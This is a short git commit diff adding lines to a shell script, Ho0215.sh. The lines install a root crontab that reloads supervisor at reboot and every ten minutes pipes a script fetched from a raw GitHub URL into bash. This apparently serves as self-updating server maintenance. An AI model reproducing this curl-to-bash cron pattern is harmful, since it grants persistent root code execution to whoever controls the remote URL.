0c670c211411ba7528e0cbbce44d045524f1850e
junscapital <52300722+junscapital@users.noreply.github.com>
2020-05-25 11:56:13 +0800

    Update Ho0215.sh

--- Ho0215.sh
+++ Ho0215.sh
@@ -1,1 +1,7 @@
 #!/bin/sh
+sudo su
+echo "@reboot sudo supervisorctl reload
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho0215.sh | bash
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
